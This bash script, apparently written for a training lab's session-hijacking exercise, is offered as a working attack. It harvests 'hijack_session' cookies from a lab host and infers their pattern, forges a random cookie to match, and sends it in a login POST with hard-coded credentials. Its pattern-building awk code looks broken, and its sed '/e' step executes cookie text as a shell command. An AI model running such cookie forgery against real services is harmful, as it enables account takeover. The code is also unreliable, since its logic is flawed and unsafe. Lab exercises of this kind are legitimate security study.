#!/bin/bash

# Base URL to fetch cookies from
BASE_URL="http://web0x01.hbtn/a1/hijack_session/"
LOGIN_URL="http://web0x01.hbtn/api/a1/hijack_session/login"

# Number of requests to make
REQUEST_COUNT=30

# Array to store retrieved cookies
cookies=()

# Fetch cookies
echo "Fetching $REQUEST_COUNT cookies from $BASE_URL..."
for ((i = 1; i <= REQUEST_COUNT; i++)); do
    cookie=$(curl -s -I "$BASE_URL" | awk '/hijack_session/ {print $2}')
    if [ -n "$cookie" ]; then
        cookies+=("$cookie")
    fi
    echo "Cookie $i: $cookie"
done

# Display all cookies
echo -e "\n--- All Retrieved Cookies ---"
printf "%s\n" "${cookies[@]}"

# Identify unique cookies
unique_cookies=($(printf "%s\n" "${cookies[@]}" | sort | uniq))
echo -e "\n--- Unique Cookies ---"
printf "%s\n" "${unique_cookies[@]}"

# Detect patterns
echo -e "\n--- Pattern Analysis ---"
if [[ ${#unique_cookies[@]} -gt 1 ]]; then
    # Extract common patterns
    pattern=$(printf "%s\n" "${unique_cookies[@]}" | awk '
    {
        for (i = 1; i <= length($0); i++) {
            char[i] = char[i] (NR == 1 ? substr($0, i, 1) : (substr($0, i, 1) == substr(first, i, 1) ? substr($0, i, 1) : "?"))
        }
        if (NR == 1) first = $0
    }
    END {
        for (i = 1; i <= length(first); i++) printf char[i]
        printf "\n"
    }')
    echo "Detected pattern: $pattern"
else
    echo "No discernible patterns. All cookies are identical."
    pattern="${unique_cookies[0]}"
fi

# Generate a random cookie based on the detected pattern
echo -e "\n--- Generating Random Cookie ---"
random_cookie=$(echo "$pattern" | sed 's/?/$(tr -dc "a-zA-Z0-9" < /dev/urandom | head -c 1)/ge')
echo "Generated cookie: $random_cookie"

# Run the POST command
echo -e "\n--- Executing POST Request ---"
response=$(curl -X POST -b "hijack_session=$random_cookie" \
    "$LOGIN_URL" \
    -d '{"email": "pepe@pepe.com", "password": "halal"}')

echo -e "\n--- Response from Login URL ---"
echo "$response"
